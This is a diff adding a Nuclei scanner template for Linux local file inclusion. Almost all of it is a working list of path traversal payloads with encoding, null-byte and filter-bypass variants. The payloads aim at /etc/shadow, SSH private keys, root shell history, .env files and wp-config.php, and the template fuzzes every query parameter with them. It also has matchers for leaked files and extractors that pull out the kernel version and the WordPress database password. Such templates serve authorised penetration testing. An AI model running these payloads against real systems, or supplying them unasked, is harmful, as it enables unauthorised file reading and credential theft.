@@ -1,0 +1,256 @@
+id: linux-lfi-comprehensive-cyphernova-v2
+
+info:
+  name: Comprehensive Linux Local File Inclusion (LFI) Scanner - v2
+  author: CypherNova1337
+  severity: high
+  description: >
+    A comprehensive Nuclei template to detect Local File Inclusion vulnerabilities on Linux systems.
+    It attempts to read a wide variety of sensitive files using numerous path traversal, encoding,
+    and filter bypass techniques. Matchers have been significantly strengthened to reduce false positives.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
+    - https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22 # Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
+  metadata:
+    max-request: 750 # Approximate, depends on the number of query parameters found on each target URL.
+                     # The nix_fuzz list is extensive.
+  tags: lfi
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      nix_fuzz:
+        # Direct file access (no traversal, if path is directly controlled)
+        - 'etc/passwd'
+        - 'etc/shadow'
+        - 'etc/group'
+        - 'proc/self/environ'
+        - 'proc/version'
+        - 'var/log/auth.log'
+        - '.env'
+        - 'WEB-INF/web.xml'
+
+        # Basic ../ traversals combined with key files
+        - '../etc/passwd'
+        - '../../etc/passwd'
+        - '../../../etc/passwd'
+        - '../../../../etc/passwd'
+        - '../../../../../etc/passwd'
+        - '../../../../../../etc/passwd'
+        - '../../../../../../../etc/passwd'
+        - '../../../../../../../../etc/passwd'
+        - '../../../../../../../../../etc/passwd'
+        - '../../../../../../../../../../etc/passwd'
+        - '../../../../../../../../../../../etc/passwd'
+        - '../../../../../../../../../../../../etc/passwd'
+
+        - '../../../etc/shadow'
+        - '../../../../../etc/shadow'
+        - '../../../../../../../etc/shadow'
+        - '../../../../../../../../../etc/shadow'
+
+        - '../../../etc/group'
+        - '../../../../../etc/group'
+
+        - '../../../proc/self/environ'
+        - '../../../../../proc/self/environ'
+        - '../../../../../../../proc/self/environ%00' # Null byte example
+
+        - '../../../proc/version'
+        - '../../../../../proc/version%00'
+
+        - '../../../var/log/auth.log'
+        - '../../../../../var/log/auth.log%00'
+        - '../../../../../var/log/apache2/access.log'
+        - '../../../../../var/log/nginx/access.log'
+
+        - '../../../.env'
+        - '../../../../../.env'
+
+        # Encoded traversals
+        - '%2e%2e%2fetc%2fpasswd'
+        - '%2e%2e/%2e%2e/etc/passwd'
+        - '..%2f..%2f..%2fetc%2fpasswd'
+        - '%252e%252e%252fetc%252fpasswd' # Double URL encoded ../
+        - '%252e%252e%252f%252e%252e%252fetc%252fpasswd'
+        - '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd'
+        - '%252e%252e%252f..%252f..%252fetc%252fpasswd' # Mixed encoding
+
+        - '..%c0%afetc%2fpasswd' # UTF-8 overlong / ..
+        - '..%c0%af..%c0%afetc%2fpasswd' # ../../
+        - '..%c0%af..%c0%af..%c0%afetc%2fpasswd' # ../../../
+        - '..%c0%af..%c0%af..%c0%af..%c0%afetc%2fpasswd'
+        - '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%2fshadow%00'
+        - '..%c0%af..%c0%af..%c0%afproc%2fself%2fcmdline'
+
+        # Tricky traversals & filter bypass attempts
+        - '....//etc/passwd' # /../../etc/passwd
+        - '....//....//etc/passwd' # /../../../../etc/passwd
+        - '....//....//....//etc/passwd'
+        - '....//....//....//....//etc/passwd'
+        - '..///////..////..//////etc/passwd'
+        - '/./././././././././././etc/passwd'
+        - '.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd' # Windows-style dots (sometimes processed)
+
+        - '/../../../../../../../../../../../etc/passwd%00.jpg' # Null byte + fake extension
+        - '/../../../../../../../../../../../etc/passwd%00.txt'
+        - '/../../../../../../../../../../../etc/group%00.png'
+        - '/../../../../../../../../../../../proc/self/environ%00.gif'
+
+        # Absolute paths (less likely for LFI but sometimes poorly configured includes)
+        - '/etc/passwd'
+        - '/etc/shadow'
+        - '/etc/group'
+        - '/etc/hosts'
+        - '/etc/hostname'
+        - '/etc/issue'
+        - '/proc/self/environ'
+        - '/proc/version'
+        - '/root/.bash_history'
+        - '/var/log/syslog'
+        - '/var/log/apache2/access.log'
+        - '/var/log/nginx/access.log'
+        - '/var/www/html/index.php'
+        - '/var/www/html/.env'
+        - '/app/.env'
+        - '/srv/www/config/config.php'
+
+        # From original user template (/etc/passwd focused)
+        - '../etc/passwd'
+        - '../../etc/passwd'
+        - '../../../etc/passwd'
+        - '/../../../../etc/passwd'
+        - '../../../../../../../../../etc/passwd'
+        - '../../../../../../../../etc/passwd'
+        - '../../../../../../../etc/passwd'
+        - '../../../../../../etc/passwd'
+        - '../../../../../etc/passwd'
+        - '../../../../etc/passwd%00'
+        - '../../../../../../../../../../../../etc/passwd%00'
+        - '../../../../../../../../../../../../etc/passwd'
+        - '/../../../../../../../../../../etc/passwd^^' # Note: ^^ is non-standard, kept from original for completeness
+        - '/../../../../../../../../../../etc/passwd'
+        - '\..\..\..\..\..\..\..\..\..\..\etc\passwd'
+        - '..\..\..\..\..\..\..\..\..\..\etc\passwd'
+        - '/..\../..\../..\../..\../..\../..\../etc/passwd'
+        - '\..\..\..\..\..\..\..\..\..\..\etc\passwd%00'
+        - '..\..\..\..\..\..\..\..\..\..\etc\passwd%00'
+        - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+        - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00'
+        - '%00/etc/passwd%00'
+        - '%00../../../../../../etc/passwd'
+        - '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd'
+        - '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+
+        # Additional files with various traversal depths
+        - '../../../../../../../../../../../../etc/profile'
+        - '../../../proc/cmdline%00'
+        - '..%c0%af..%c0%afvar/log/nginx/error.log'
+        - '....//root/.ssh/id_rsa'
+        - '.././.././../etc/hosts%00.txt'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/WEB-INF/web.xml'
+        - '../../../../../../../../../../../../../../../../../../../../../../etc/resolv.conf'
+        - '../../../../../../../../../../../../../../../../../../../../../../etc/sysctl.conf'
+        - '../../../../../../../../../../../../../../../../../../../../../../etc/crontab'
+        - '../../../../../../../../../../../../../../../../../../../../../../var/log/messages'
+        - '../../../../../../../../../../../../../../../../../../../../../../var/log/secure'
+        - '../../../../../../../../../../../../../../../../../../../../../../root/.zsh_history'
+        - '../../../../../../../../../../../../../../../../../../../../../../etc/ssh/sshd_config'
+        - '../../../../../../../../../../../../../../../../../../../../../../proc/cpuinfo'
+        - '../../../../../../../../../../../../../../../../../../../../../../proc/meminfo'
+        - '../../../../../../../../../../../../../../../../../../../../../../proc/net/tcp'
+        - '../../../../../../../../../../../../../../../../../../../../../../proc/net/udp'
+        - '../../../../../../../../../../../../../../../../../../../../../../proc/net/arp'
+        - '../../../../../../../../../../../../../../../../../../../../../../proc/sched_debug'
+        - '../../../../../../../../../../../../../../../../../../../../../../var/www/html/wp-config.php'
+        - '../../../../../../../../../../../../../../../../../../../../../../app/config/parameters.yml'
+
+    fuzzing:
+      - part: query
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: multiple # replaces all parameters value with fuzz payload
+        fuzz:
+          - "{{nix_fuzz}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        condition: or # At least one of these content regexes should match
+        part: body
+        regex:
+          # /etc/passwd: Look for root, and at least 2 other common system user lines with typical structures.
+          - "(?im)(?:^root:[x*!]:0:0:[^:\r\n]*:(?:/root|/var/root|/):(?:/bin/(?:bash|sh|ksh|zsh)|/usr/sbin/nologin|/sbin/nologin)[\r\n]+)(?:(?:^[a-zA-Z0-9_-]+:[x*!]:[0-9]+:[0-9]+:[^:\r\n]*:[^:\r\n]*:(?:/bin/(?:bash|sh|ksh|zsh)|/usr/sbin/nologin|/sbin/nologin)[\r\n]+){2,})"
+
+          # /etc/shadow: Look for root user with a recognizable hash structure or locked state, and at least one other user line.
+          - "(?im)(?:^root:(?:\\$[1256yabsg]*(?:/[a-zA-Z0-9./$]+)*\\$[a-zA-Z0-9./$]+|[*!xLKU]+):[0-9]+:[0-9]*:[0-9]*:[0-9]*:::(?:\\s*#.*)?[\r\n]+)(?:(?:^[a-zA-Z0-9_-]+:(?:\\$[1256yabsg]*(?:/[a-zA-Z0-9./$]+)*\\$[a-zA-Z0-9./$]+|[*!xLKU]+):[0-9]+:[0-9]*:[0-9]*:[0-9]*:::(?:\\s*#.*)?[\r\n]+))"
+
+          # /etc/group: Look for root, and at least 2 other common system group lines.
+          - "(?im)(?:^root:x:0:(?:root,)?(?:[a-zA-Z0-9_-]+(?:,[a-zA-Z0-9_-]+)*)?[\r\n]+)(?:(?:^[a-zA-Z0-9_-]+:x:[0-9]+:(?:[a-zA-Z0-9_-]+(?:,[a-zA-Z0-9_-]+)*)?[\r\n]+){2,})"
+
+          # /proc/self/environ: Look for multiple common environment variables separated by null bytes (represented as \x00).
+          - "(?s)\\bUSER=[^\\x00]+\\x00.*?\\bPATH=(?:/usr/local/sbin|/usr/local/bin|/usr/sbin|/usr/bin|/sbin|/bin)[^\\x00]*\\x00.*?\\bHOME=/[^\\x00]+\\x00"
+
+          # /proc/version: More specific match for Linux version string format.
+          - "(?i)^Linux version \\d+\\.\\d+\\.\\d+[^\\r\\n(]*\\((?:[^\\)]+@)?([^\\)]+)\\) \\(gcc(?: version)? \\d+\\.\\d+\\.\\d+[^\\r\n]*\\) #\\d+ SMP"
+
+          # /etc/hosts: Look for the localhost IPv4 and IPv6 entries.
+          - "(?im)(?:^127\\.0\\.0\\.1\\s+localhost(?:\\s*#.*)?[\r\n]+)(?:^::1\\s+(?:localhost|ip6-localhost)\\s*(?:ip6-loopback)?(?:\\s*#.*)?[\r\n]+)"
+
+          # /etc/hostname: Typically a single line with valid hostname characters.
+          - "(?m)^[a-zA-Z0-9](?:[a-zA-Z0-9.-]{0,253}[a-zA-Z0-9])?$"
+
+          # /etc/issue: Common distro identifiers or "Kernel" reference.
+          - "(?i)(Debian GNU/Linux \\d+|Ubuntu \\d+\\.\\d+|CentOS(?: Linux)? release \\d+|Red Hat Enterprise Linux.*release \\d+|Welcome to Alpine Linux|Kernel \\d+\\.\\d+ on an \\S+)"
+
+          # /etc/crontab: Look for crontab specific syntax like minute/hour/day fields and user.
+          - "(?m)^\\s*(?:#.*[\r\n]+|SHELL=|PATH=|MAILTO=|HOME=|\\*|[0-5]?[0-9](?:-[0-5]?[0-9])?(?:,[0-5]?[0-9](?:-[0-5]?[0-9])?)*\\s+(?:\\*|[01]?[0-9]|2[0-3](?:-[01]?[0-9]|2[0-3])?)(?:,(?:[01]?[0-9]|2[0-3])(?:-([01]?[0-9]|2[0-3]))?)*\\s+){4}"
+
+          # Common log file patterns (Apache/Nginx access log entry, or syslog timestamp)
+          - "(?:\\b(?:GET|POST|PUT|DELETE|HEAD|OPTIONS) /[^\\s]* HTTP/(?:1\\.0|1\\.1|2\\.0)\\\" \\d{3} \\d+)|(?:(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2})"
+
+          # SSH Private Keys (explicit end markers, no backreferences)
+          - "(?s)-----BEGIN EC PRIVATE KEY-----.*?-----END EC PRIVATE KEY-----"
+          - "(?s)-----BEGIN DSA PRIVATE KEY-----.*?-----END DSA PRIVATE KEY-----"
+          - "(?s)-----BEGIN RSA PRIVATE KEY-----.*?-----END RSA PRIVATE KEY-----"
+          - "(?s)-----BEGIN OPENSSH PRIVATE KEY-----.*?-----END OPENSSH PRIVATE KEY-----"
+          - "(?s)-----BEGIN PRIVATE KEY-----.*?-----END PRIVATE KEY-----"
+
+          # WEB-INF/web.xml (Java): Basic structure check
+          - "(?is)<web-app[^>]*>.*?<(?:servlet|filter)-name>.*?</(?:servlet|filter)-name>.*?</web-app>"
+          # .env file: Common variable assignments
+          - "(?m)^APP_KEY=[a-zA-Z0-9\\+/=]{32,}[\r\n]*(?:^DB_HOST=[\r\n]*)*" # APP_KEY and optionally DB_HOST
+          # wp-config.php (WordPress): DB_NAME and table_prefix
+          - "(?s)define\\s*\\(\\s*['\"]DB_NAME['\"]\\s*,[^\\)]+\\);.*?\\$table_prefix\\s*=\\s*['\"][a-zA-Z0-9_]+['\"];"
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "(?im)^root:x:0:0:([^:]*):" # Extract root user's GECOS field from /etc/passwd
+          - "(?i)Linux version (\\d+\\.\\d+\\.\\d+[-%\\w\\.]+)" # Extract kernel version
+          - "\\b(USER=([^\\x00]+))\\x00" # Extract USER from /proc/self/environ
+          - "(?s)define\\s*\\(\\s*['\"]DB_PASSWORD['\"]\\s*,\\s*['\"]([^'\"]+)['\"]\\s*\\);" # Extract DB_PASSWORD from wp-config.php (example)
